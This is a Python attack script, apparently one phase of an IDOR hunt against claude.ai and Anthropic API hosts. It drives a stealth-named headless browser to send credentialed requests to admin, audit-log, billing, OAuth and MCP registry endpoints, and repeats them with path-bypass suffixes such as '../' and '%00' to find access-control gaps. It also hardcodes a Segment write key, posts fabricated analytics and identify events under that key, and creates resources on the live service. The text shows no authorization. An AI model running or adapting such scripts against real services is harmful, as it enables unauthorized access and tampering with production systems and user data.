#!/usr/bin/env python3
"""Phase 4: Test newly discovered endpoints from network interception."""
import asyncio, json, os
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-idor-phase4"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []
SEGMENT_KEY = "LKJN8LsLERHEOXkw487o7qCTFOrGPimI"

async def test_fetch(page, url, method="GET", body=None, extra_headers=None):
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        hdr_js = ""
        if extra_headers:
            for hk, hv in extra_headers.items():
                hdr_js += f"'{hk}': '{hv}', "
        if has_body:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{'Content-Type': 'application/json', {hdr_js}}},
                        body: JSON.stringify({body_json})
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 3000), headers: Object.fromEntries(resp.headers.entries())}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{{hdr_js}}}
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 3000), headers: Object.fromEntries(resp.headers.entries())}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        return r
    except:
        return {"status": 0, "body": ""}

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    # NEW ENDPOINTS TO TEST
    tests = [
        # MCP Registry - NEW!
        {"name": "mcp-registry-servers", "host": "api.anthropic.com", "method": "GET", "path": "/mcp-registry/v0/servers", "query": {"version": "latest", "limit": "100"}},
        {"name": "mcp-registry-servers-search", "host": "api.anthropic.com", "method": "GET", "path": "/mcp-registry/v0/servers", "query": {"version": "latest", "limit": "100", "search": "test"}},
        {"name": "mcp-registry-servers-1", "host": "api.anthropic.com", "method": "GET", "path": "/mcp-registry/v0/servers/1", "query": {}},
        {"name": "mcp-registry-servers-0", "host": "api.anthropic.com", "method": "GET", "path": "/mcp-registry/v0/servers/0", "query": {}},
        {"name": "mcp-registry-servers-admin", "host": "api.anthropic.com", "method": "GET", "path": "/mcp-registry/v0/servers/admin", "query": {}},

        # i18n files - data leak?
        {"name": "i18n-en", "host": "claude.ai", "method": "GET", "path": "/i18n/en-US.json", "query": {}},
        {"name": "i18n-dynamic", "host": "claude.ai", "method": "GET", "path": "/i18n/dynamic/en-US.json", "query": {}},
        {"name": "i18n-es", "host": "claude.ai", "method": "GET", "path": "/i18n/es.json", "query": {}},
        {"name": "i18n-ja", "host": "claude.ai", "method": "GET", "path": "/i18n/ja.json", "query": {}},
        {"name": "i18n-zh", "host": "claude.ai", "method": "GET", "path": "/i18n/zh-CN.json", "query": {}},

        # SRI params
        {"name": "sri-params", "host": "a-cdn.claude.ai", "method": "GET", "path": "/params/sri/EEA5F558-D6AC-4C03-B678-AABF639EE69A", "query": {}},

        # Segment with real write key
        {"name": "segment-batch-real", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/batch", "query": {}, "body": {"writeKey": SEGMENT_KEY, "batch": [{"type": "track", "event": "test", "properties": {}, "anonymousId": "test-123"}]}},
        {"name": "segment-identify-real", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/identify", "query": {}, "body": {"writeKey": SEGMENT_KEY, "userId": "test", "traits": {"email": "test@test.com"}}},
        {"name": "segment-track-real", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/track", "query": {}, "body": {"writeKey": SEGMENT_KEY, "event": "test", "properties": {}}},
        {"name": "segment-import-real", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/import", "query": {}, "body": {"writeKey": SEGMENT_KEY, "batch": []}},
        {"name": "segment-settings", "host": "a-cdn.anthropic.com", "method": "GET", "path": f"/v1/projects/{SEGMENT_KEY}/settings", "query": {}},

        # Auth endpoints with session
        {"name": "auth-session", "host": "claude.ai", "method": "GET", "path": "/api/auth/session", "query": {}},
        {"name": "auth-refresh", "host": "claude.ai", "method": "POST", "path": "/api/auth/refresh", "query": {}, "body": {}},

        # Bootstrap with params
        {"name": "bootstrap-full", "host": "claude.ai", "method": "GET", "path": "/edge-api/bootstrap", "query": {"statsig_hashing_algorithm": "djb2", "growthbook_format": "sdk", "include_sy": "true"}},

        # Additional API endpoints from binary analysis
        {"name": "conversations", "host": "claude.ai", "method": "GET", "path": "/api/conversations", "query": {}},
        {"name": "conversations-new", "host": "claude.ai", "method": "POST", "path": "/api/conversations", "query": {}, "body": {"name": "test"}},
        {"name": "projects", "host": "claude.ai", "method": "GET", "path": "/api/projects", "query": {}},
        {"name": "projects-new", "host": "claude.ai", "method": "POST", "path": "/api/projects", "query": {}, "body": {"name": "test"}},
        {"name": "artifacts", "host": "claude.ai", "method": "GET", "path": "/api/artifacts", "query": {}},
        {"name": "published-artifacts", "host": "claude.ai", "method": "GET", "path": "/api/published_artifacts", "query": {}},
        {"name": "users-me", "host": "claude.ai", "method": "GET", "path": "/api/users/me", "query": {}},
        {"name": "user-settings", "host": "claude.ai", "method": "GET", "path": "/api/user_settings", "query": {}},
        {"name": "notifications", "host": "claude.ai", "method": "GET", "path": "/api/notifications", "query": {}},
        {"name": "feature-flags", "host": "claude.ai", "method": "GET", "path": "/api/feature_flags", "query": {}},
        {"name": "experiments", "host": "claude.ai", "method": "GET", "path": "/api/experiments", "query": {}},
        {"name": "organizations-new", "host": "claude.ai", "method": "POST", "path": "/api/organizations", "query": {}, "body": {"name": "test"}},
        {"name": "teams", "host": "claude.ai", "method": "GET", "path": "/api/teams", "query": {}},
        {"name": "teams-new", "host": "claude.ai", "method": "POST", "path": "/api/teams", "query": {}, "body": {"name": "test"}},
        {"name": "usage", "host": "claude.ai", "method": "GET", "path": "/api/usage", "query": {}},
        {"name": "billing-invoices", "host": "claude.ai", "method": "GET", "path": "/api/billing/invoices", "query": {}},
        {"name": "billing-payment-methods", "host": "claude.ai", "method": "GET", "path": "/api/billing/payment_methods", "query": {}},
        {"name": "admin-users", "host": "claude.ai", "method": "GET", "path": "/api/admin/users", "query": {}},
        {"name": "admin-organizations", "host": "claude.ai", "method": "GET", "path": "/api/admin/organizations", "query": {}},
        {"name": "admin-audit-logs", "host": "claude.ai", "method": "GET", "path": "/api/admin/audit_logs", "query": {}},
        {"name": "oauth-authorize", "host": "claude.ai", "method": "GET", "path": "/api/oauth/authorize", "query": {"client_id": "test", "redirect_uri": "http://localhost", "response_type": "code"}},
        {"name": "oauth-token", "host": "claude.ai", "method": "POST", "path": "/api/oauth/token", "query": {}, "body": {"grant_type": "authorization_code", "code": "test"}},
    ]

    TRAILING = [",", ";", ":", "%00", "%0a", "?", "../", "%20"]

    for test in tests:
        name = test["name"]
        host = test["host"]
        method = test["method"]
        path = test["path"]
        query = test.get("query", {})
        body = test.get("body")

        print(f"\n{'='*60}")
        print(f"🎯 {name}: {method} {host}{path}")

        # Baseline
        if body:
            url = f"https://{host}{path}"
            if query:
                url += "?" + urlencode(query, doseq=True)
            baseline = await test_fetch(page, url, method, body)
        elif query:
            url = f"https://{host}{path}?{urlencode(query, doseq=True)}"
            baseline = await test_fetch(page, url, method)
        else:
            url = f"https://{host}{path}"
            baseline = await test_fetch(page, url, method)

        b_status = baseline.get("status", 0)
        b_body = baseline.get("body", "")
        print(f"   Baseline: {b_status} | {b_body[:150]}")

        FINDINGS.append({"endpoint": name, "technique": "baseline", "url": url, "method": method, "status": b_status, "body": b_body[:1000]})
        with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
            json.dump(FINDINGS, fp, indent=2)

        # Trailing symbols
        for sym in TRAILING:
            bypass_url = f"https://{host}{path}{sym}"
            if query:
                bypass_url += "?" + urlencode(query, doseq=True)
            r = await test_fetch(page, bypass_url, method, body)
            status = r.get("status", 0)
            resp_body = r.get("body", "")

            if status != b_status and status != 0:
                print(f"   🔥 trailing-{sym:8s} → {status} | {b_status}→{status}")
                if resp_body and len(resp_body) > 10:
                    print(f"      Body: {resp_body[:200]}")
                FINDINGS.append({"endpoint": name, "technique": f"trailing-{sym}", "url": bypass_url, "method": method, "status": status, "body": resp_body[:1000], "anomaly": f"CHANGE {b_status}→{status}"})
                with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                    json.dump(FINDINGS, fp, indent=2)
            await asyncio.sleep(0.15)

    # Summary
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)

    anomalies = [f for f in FINDINGS if f.get("anomaly")]
    print(f"\n{'='*60}")
    print(f"📊 Total findings: {len(FINDINGS)}, Anomalies: {len(anomalies)}")
    for f in anomalies:
        print(f"   🔥 [{f['endpoint']}] {f['technique']:30s} → {f['status']} | {f['anomaly']}")
        if f.get("body") and len(f["body"]) > 20:
            print(f"      Body: {f['body'][:200]}")

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
